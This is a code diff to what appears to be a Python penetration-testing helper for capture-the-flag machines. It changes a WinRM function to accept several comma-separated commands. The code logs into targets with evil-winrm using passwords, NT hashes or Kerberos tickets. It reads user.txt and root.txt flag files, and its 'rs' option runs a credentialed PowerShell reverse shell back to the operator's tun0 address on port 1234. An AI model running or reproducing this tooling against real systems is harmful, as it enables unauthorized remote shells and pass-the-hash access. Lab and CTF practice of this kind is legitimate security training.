@@ -46,7 +46,7 @@ Info:\t/
     print(f'\n\033[96m[$]\033[0m {cmd3}')
     print('\033[38;5;28m[+]\033[0m List SMB shares\n')
 
-def winrm(box, path, cmd):
+def winrm(box, path, cmd_):
     if config.HELP:    
         print("""
 Action:\t[Protocol] winrm
@@ -66,36 +66,38 @@ Info:\tWhen passing commands with options, the shell closes or hangs.
     #os.chdir(path.ws_scr)
     print('\033[92m[*]\033[0m Login to WinRm (run CMD)')
     ps_cmd = ""
-    if cmd:
-        if cmd.replace(".txt","") == "user":
-            ps_cmd = f'''echo "gc (join-path ([Environment]::GetFolderPath('Desktop')) user.txt)" | '''
-        elif cmd.replace(".txt","") == "root":
-            ps_cmd = f'''echo "type /Users/Administrator/Desktop/root.txt" | '''
-        elif cmd == "rs":
-            # pass via cmd=rs-ps or rs-runas (to do)
-            username = box.username
-            password = box.password
-            if box.target:
-                if ":" not in box.target:
-                    print("\033[91m[!]\033[0m Separate username and password with :")
-                    exit()
-                username, password = box.target.split(":", 1)
-            ip = config.get_tun0_ip()
-            port = "1234"
-            print(f'[*] Run revshell as {username} : {password}')
-            print(f'[*] Start listener on {ip}:{port}')
-            ps_cmd = f'''echo "$c=New-Object PSCredential('{box.domain}\\{username}',(ConvertTo-SecureString '{password}' -AsPlainText -Force)); icm {box.hostname} -Cred $c {{ cmd /c {payload.revshell_ps(username, password, ip, port)} }}" | '''.replace('$', '\\$')
+    cmds = cmd_.split(",")
+    if cmds:
+        for cmd in cmds:
+            if cmd.replace(".txt","") == "user":
+                ps_cmd = r'echo "Get-ChildItem -Path C:\Users -Filter "user.txt" -Recurse -ErrorAction SilentlyContinue | ForEach-Object  { Get-Content \$_.FullName }" | '
+            elif cmd.replace(".txt","") == "root":
+                ps_cmd = 'echo "type /Users/Administrator/Desktop/root.txt" | '
+            elif cmd == "rs":
+                # pass via cmd=rs-ps or rs-runas (to do)
+                username = box.username
+                password = box.password
+                if box.target:
+                    if ":" not in box.target:
+                        print("\033[91m[!]\033[0m Separate username and password with :")
+                        exit()
+                    username, password = box.target.split(":", 1)
+                ip = config.get_tun0_ip()
+                port = "1234"
+                print(f'[*] Run revshell as {username} : {password}')
+                print(f'[*] Start listener on {ip}:{port}')
+                ps_cmd = f'''echo "$c=New-Object PSCredential('{box.domain}\\{username}',(ConvertTo-SecureString '{password}' -AsPlainText -Force)); icm {box.hostname} -Cred $c {{ cmd /c {payload.revshell_ps(username, password, ip, port)} }}" | '''.replace('$', '\\$')
 
-    if box.krb or isinstance(box.krb, str):
-        cmd = f"{ps_cmd}{box.krb_ccache} evil-winrm -i {box.fqdn} -r {box.domain}"
-    elif box.nt_hash:
-        cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -H {box.nt_hash}"
-    else:
-        cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -p {box.password}"
-    config.log_cmd(cmd)
-    print(f'\033[96m[$]\033[0m {cmd}')
-    os.system(cmd)
-    print('\033[38;5;28m[+]\033[0m Login to WinRm')
+            if box.krb or isinstance(box.krb, str):
+                cmd = f"{ps_cmd}{box.krb_ccache} evil-winrm -i {box.fqdn} -r {box.domain}"
+            elif box.nt_hash:
+                cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -H {box.nt_hash}"
+            else:
+                cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -p {box.password}"
+            config.log_cmd(cmd)
+            print(f'\033[96m[$]\033[0m {cmd}')
+            os.system(cmd)
+            print('\033[38;5;28m[+]\033[0m Login to WinRm')
 
 def ldap(box, path, cmd):
     if config.HELP:    
